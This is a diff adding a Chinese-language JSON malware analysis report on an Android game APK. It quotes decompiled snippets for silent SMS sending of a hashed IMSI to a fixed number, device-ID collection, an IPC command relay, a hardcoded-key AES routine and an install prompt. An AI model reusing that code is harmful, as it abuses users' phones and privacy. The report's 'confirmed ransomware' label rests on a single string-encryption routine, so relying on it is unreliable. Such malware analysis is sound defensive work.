@@ -1,0 +1,190 @@
+{
+  "APK信息": {
+    "文件名": "ac1bd0dc8b45f9fc74fa471165ece2ccf8238444fde3750b54aa2c338f4e76f4.apk",
+    "sha256": "ac1bd0dc8b45f9fc74fa471165ece2ccf8238444fde3750b54aa2c338f4e76f4",
+    "包名": "com.zj.tdplants",
+    "应用名": "植物大战怪兽",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 894.8
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "poll"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lsafiap\\framework\\ui\\b;",
+          "method_signature": "while(!this.a.m.isEmpty()",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "this.a.q = ISAFFramework.Stub.asInterface(iBinder);\nwhile (!this.a.m.isEmpty()) {\n    this.a.a((String) this.a.m.poll());\n}",
+          "malicious_code_snippet_context": "      @Override // android.content.ServiceConnection\n      public final void onServiceConnected(ComponentName componentName, IBinder iBinder) {\n          synchronized (this.a.c) {\n>>>             this.a.q = ISAFFramework.Stub.asInterface(iBinder);\n>>>             UpdateHintActivity.d.d(\"UpdateHintActivity onServiceConnected\");\n>>>             while (!this.a.m.isEmpty()) {\n>>>                 this.a.a((String) this.a.m.poll());\n              }\n          }\n      }",
+          "behavior_description": "该代码是 UpdateHintActivity 内部的 ServiceConnection 回调。当与 safiapframework（SAF 框架，已知的静默安装/后台服务框架）的服务建立连接后，通过 ISAFFramework.Stub.asInterface(iBinder) 获取 IPC 代理接口，随后循环取出队列 m 中缓存的字符串命令，逐条通过 this.a.a(String) 转发给绑定的后台服务执行。数据流向：命令队列 this.a.m（source，缓存的指令/下载链接，疑似由远程服务器下发）→ IPC 调用转发至特权后台服务执行（sink）。该命令中继机制构成远程控制/静默下载执行链路的一环，服务断开时置空引用以便重连后继续派发命令，具有典型的命令排队与重连续传特征。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage",
+              "SmsManager"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\ccit\\mmwlan\\MMClientSDK_ForIdentity;",
+          "method_signature": "registerIdentity()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "String imsi = MMClientSDK_ForLogin.getDigest(Constant.HASH_MD5, this.deviceInfo.getStrImsi());\nString msg = String.format(\"GDWLANIDP#%s#%s:%s\", imsi, getSessionID(), this.userProfile.appID);\nSmsManager smsManager = SmsManager.getDefault();\nsmsManager.sendTextMessage(\"10658682803\", null, msg, null, null);",
+          "malicious_code_snippet_context": "      }\n  \n      public String registerIdentity() {\n>>>         String imsi = MMClientSDK_ForLogin.getDigest(Constant.HASH_MD5, this.deviceInfo.getStrImsi());\n>>>         String msg = String.format(\"GDWLANIDP#%s#%s:%s\", imsi, getSessionID(), this.userProfile.appID);\n>>>         SmsManager smsManager = SmsManager.getDefault();\n>>>         smsManager.sendTextMessage(\"10658682803\", null, msg, null, null);\n          Log.v(this.TAG, \"send sms:\" + msg + \" to:10658682803\");\n          return msg;\n      }",
+          "behavior_description": "代码从设备信息中获取IMSI标识并计算MD5哈希，将其与会话ID(getSessionID())和应用ID(userProfile.appID)拼接构造短信内容，随后通过SmsManager.sendTextMessage()在无任何用户感知和确认的情况下静默发送短信至固定号码10658682803。数据流向：deviceInfo.getStrImsi()获取设备IMSI → MD5哈希处理 → String.format拼接消息 → sendTextMessage()静默发送。该行为未经用户同意擅自发送短信，可能造成用户短信资费损失，并将设备标识信息（IMSI哈希、会话ID）静默传输给外部号码，属于恶意样本中的静默短信发送行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getImei",
+          "getSubscriberId",
+          "getMacAddress"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\ccit\\mmwlan\\MMClientSDK_ForIdentity;",
+          "method_signature": "getDeviceID()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public String getDeviceID() {\n    if (this.deviceInfo == null) {\n        GetDeviceInfo getDevInfo = new GetDeviceInfo();\n        this.deviceInfo = getDevInfo.getDeviceInfo(this.context, this.userProfile.cardSlot);\n    }\n    if (this.deviceInfo == null) {\n        return null;\n    }",
+          "malicious_code_snippet_context": "          return result;\n      }\n  \n>>>     public String getDeviceID() {\n>>>         if (this.deviceInfo == null) {\n>>>             GetDeviceInfo getDevInfo = new GetDeviceInfo();\n>>>             try {\n>>>                 this.deviceInfo = getDevInfo.getDeviceInfo(this.context, this.userProfile.cardSlot);\n>>>             } catch (ClientSDKException e) {\n>>>                 e.printStackTrace();\n>>>             }\n          }\n          if (this.deviceInfo == null) {\n              return null;",
+          "behavior_description": "该方法通过 GetDeviceInfo.getDeviceInfo(context, cardSlot) 读取设备标识信息（基于指定SIM卡槽，通常包含IMEI/IMSI等硬件标识符），将结果缓存在 deviceInfo 字段中，并通过 getDeviceID() 返回设备唯一标识。数据流向：设备硬件标识符→GetDeviceInfo读取→内存缓存→作为设备指纹返回给上层调用方。在已确认恶意的样本中，此类设备指纹采集通常用于受害者追踪、与窃取的隐私数据关联标识或后续上报服务器，属于过度采集设备隐私信息的行为；但该片段本身仅完成采集与返回，未直接展示数据外传操作。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\chinaMobile\\d;",
+          "method_signature": "for(int i = 0; i < bytes.length && i < bArr.length; i++)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "byte[] bytes = \"134e3265829ff82daf16e7b740a600b5\".getBytes();\nbyte[] bArr = new byte[16];\nfor (int i = 0; i < bytes.length && i < bArr.length; i++) {\n    bArr[i] = bytes[i];\n}\nthis.b = new SecretKeySpec(bArr, \"AES\");\nCipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\ncipher.init(1, this.b, new IvParameterSpec(\"0102030405060708\".getBytes()));\nreturn b(new h().a(cipher.doFinal(str.getBytes())));",
+          "malicious_code_snippet_context": "  \n      public final byte[] a(String str) throws BadPaddingException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, InvalidKeyException, InvalidAlgorithmParameterException {\n          if (this.b == null) {\n>>>             byte[] bytes = \"134e3265829ff82daf16e7b740a600b5\".getBytes();\n>>>             byte[] bArr = new byte[16];\n>>>             for (int i = 0; i < bytes.length && i < bArr.length; i++) {\n>>>                 bArr[i] = bytes[i];\n>>>             }\n>>>             this.b = new SecretKeySpec(bArr, \"AES\");\n>>>         }\n>>>         Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n>>>         cipher.init(1, this.b, new IvParameterSpec(\"0102030405060708\".getBytes()));\n          return b(new h().a(cipher.doFinal(str.getBytes())));\n      }\n  }",
+          "behavior_description": "该代码位于伪装成中国移动的恶意类 com.chinaMobile.d 中，实现了一个AES加密例程：使用硬编码的密钥材料（字符串\"134e3265829ff82daf16e7b740a600b5\"的前16字节）构造SecretKeySpec，配合固定IV（\"0102030405060708\"）初始化AES/CBC/PKCS5Padding加密器（init模式1为ENCRYPT_MODE），随后对传入的数据str执行cipher.doFinal()加密，密文经编码后返回。数据流向：待加密数据str.getBytes() → AES/CBC硬编码密钥加密 → 密文输出。作为已确认勒索样本的加密核心例程，该硬编码密钥使攻击者完全掌控解密能力，用户数据被加密后无法自行恢复，构成勒索/破坏性加密行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lsafiap\\framework\\sdk\\b\\d;",
+          "method_signature": "if(context != null && file != null)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setDataAndType(Uri.fromFile(file), \"application/vnd.android.package-archive\");\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "  \n      public static void a(Context context, File file) {\n          if (context != null && file != null) {\n>>>             Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>             intent.setDataAndType(Uri.fromFile(file), \"application/vnd.android.package-archive\");\n>>>             intent.addFlags(268435456);\n>>>             context.startActivity(intent);\n          }\n      }\n  ",
+          "behavior_description": "该方法接收Context和File参数，构造ACTION_VIEW意图，通过Uri.fromFile(file)将本地APK文件与MIME类型application/vnd.android.package-archive绑定，并添加FLAG_ACTIVITY_NEW_TASK(268435456)标志后调起系统Package Installer，弹窗引导用户安装指定APK。数据流向：本地APK文件（通常为SDK后台静默下载的推广包或附加载荷）→ 系统安装器安装界面。该代码并非真正的静默安装（安装仍需用户在系统弹窗中点击确认），但属于未经用户主动请求的应用推广安装行为，位于safiap推广SDK中，可能被恶意样本用于诱导用户安装附加恶意组件，故判定为灰色行为而非明确恶意。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
